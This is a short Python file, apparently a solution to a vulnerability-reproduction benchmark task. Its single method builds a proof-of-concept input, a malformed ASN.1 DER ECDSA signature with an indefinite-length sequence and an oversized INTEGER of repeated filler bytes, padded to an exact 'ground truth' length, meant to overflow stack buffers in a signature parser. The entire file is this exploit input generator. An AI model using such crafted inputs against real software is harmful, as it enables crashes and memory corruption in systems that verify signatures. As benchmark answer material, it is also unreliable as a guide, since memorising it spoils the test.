import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth length is 41798 bytes
        # Create a signature that will overflow stack buffers during ASN.1 parsing
        
        # Build an ASN.1 DER encoded ECDSA signature with malformed structure
        # to trigger buffer overflow during parsing
        
        # Start with SEQUENCE tag
        poc = b'\x30'  # SEQUENCE
        
        # Length will be large - using indefinite length encoding 
        # to potentially confuse parsers
        poc += b'\x80'  # Indefinite length
        
        # First INTEGER (r) - make it very large
        poc += b'\x02'  # INTEGER tag
        
        # Very large length - will overflow fixed buffers
        # Using 0x84 for 4-byte length (though 4 bytes is excessive)
        int_length = 41790  # Nearly the entire PoC size
        poc += b'\x84'  # Length in 4 bytes
        poc += struct.pack('>I', int_length)
        
        # Fill with pattern that could trigger overflow
        # Using repeating pattern to increase chance of hitting vulnerable code
        pattern = b'\x41' * 100 + b'\x42' * 100 + b'\x43' * 100  # ABC pattern
        repeats = int_length // len(pattern)
        remainder = int_length % len(pattern)
        
        poc += pattern * repeats
        poc += pattern[:remainder]
        
        # End of indefinite length
        poc += b'\x00\x00'
        
        # Ensure exact target length
        current_len = len(poc)
        if current_len < 41798:
            poc += b'\x00' * (41798 - current_len)
        elif current_len > 41798:
            poc = poc[:41798]
        
        return poc